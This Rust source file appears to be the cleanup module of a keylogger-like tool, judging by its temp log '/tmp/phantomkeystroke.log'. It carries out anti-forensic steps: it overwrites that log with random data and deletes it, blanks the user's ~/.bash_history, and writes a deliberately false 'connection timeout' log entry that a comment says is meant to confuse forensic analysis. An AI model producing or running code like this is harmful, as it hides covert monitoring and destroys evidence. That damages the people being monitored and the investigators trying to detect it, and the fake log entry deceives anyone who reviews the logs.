use log::info;
use std::fs;
use std::path::Path;

/// Perform cleanup operations before program exit
pub async fn perform_cleanup() -> Result<(), Box<dyn std::error::Error>> {
    info!("Performing cleanup operations");
    
    // Remove temporary files
    clean_temp_files()?;
    
    // Clear terminal history (where possible)
    clear_terminal_history()?;
    
    // Log a misleading message to confuse forensic analysis
    info!("Session ended unexpectedly due to connection timeout");
    
    Ok(())
}

/// Clean up temporary files created by the program
fn clean_temp_files() -> Result<(), Box<dyn std::error::Error>> {
    let temp_log_path = Path::new("/tmp/phantomkeystroke.log");
    
    if temp_log_path.exists() {
        // First overwrite the file with random data
        if let Ok(metadata) = fs::metadata(&temp_log_path) {
            let file_size = metadata.len();
            
            if file_size > 0 {
                // Generate random data and overwrite the file
                let random_data: Vec<u8> = (0..file_size)
                    .map(|_| rand::random::<u8>())
                    .collect();
                
                fs::write(&temp_log_path, &random_data)?;
            }
        }
        
        // Then delete the file
        fs::remove_file(temp_log_path)?;
    }
    
    Ok(())
}

/// Clear terminal history where possible
fn clear_terminal_history() -> Result<(), Box<dyn std::error::Error>> {
    // This is a platform-specific operation and might not work in all environments
    
    // For Linux/macOS, attempt to clear history
    #[cfg(unix)]
    {
        // Try to execute standard terminal commands to clear history
        // Note: This requires the user to have the correct terminal
        use std::process::Command;
        
        // Try to clear screen first
        let _ = Command::new("clear").status();
        
        // Try to edit bash history
        let home = std::env::var("HOME").unwrap_or_else(|_| String::from("/tmp"));
        let bash_history = format!("{}/.bash_history", home);
        
        if Path::new(&bash_history).exists() {
            let _ = fs::write(&bash_history, "");
        }
    }
    
    // For Windows, not implemented yet
    #[cfg(windows)]
    {
        // Windows-specific implementation would go here
    }
    
    Ok(())
}

/// Zero out memory for sensitive data
#[allow(dead_code)]
pub fn secure_zero_memory<T: AsMut<[u8]>>(buffer: &mut T) {
    let buffer = buffer.as_mut();
    // Use volatile writes to ensure the compiler doesn't optimize this away
    for byte in buffer.iter_mut() {
        unsafe {
            std::ptr::write_volatile(byte, 0);
        }
    }
} 